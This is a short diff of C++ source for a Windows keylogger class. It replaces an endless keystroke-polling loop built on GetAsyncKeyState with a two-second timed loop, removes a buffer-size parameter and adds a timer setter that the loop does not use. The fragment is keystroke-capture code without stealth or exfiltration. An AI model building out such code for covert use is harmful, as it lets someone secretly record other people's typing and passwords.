@@ -1,9 +1,7 @@
 #include "./keylogger.hpp"
 
-keylogger::keylogger(size_t p_buffer_size)
+keylogger::keylogger()
 {
-	a_buffer_size = p_buffer_size;
-
 	a_buffer = new string();
 }
 
@@ -14,7 +12,8 @@ keylogger::~keylogger()
 
 void keylogger::start()
 {
-	while (TRUE)
+	for(chrono::time_point<chrono::system_clock> runUntil = chrono::system_clock::now() + chrono::seconds(2);
+			std::chrono::system_clock::now() < runUntil;)
 		for (int t_key = 1; t_key < 255; t_key++)
 			if (GetAsyncKeyState(t_key) == -32767)
 			{
@@ -57,4 +56,9 @@ void keylogger::set_alphabet_only(bool p_alphabet_only)
 void keylogger::set_store_character(bool p_store_character)
 {
 	a_store_character = p_store_character;
+}
+
+void keylogger::set_timer(int p_timer)
+{
+	a_timer = p_timer;
 }
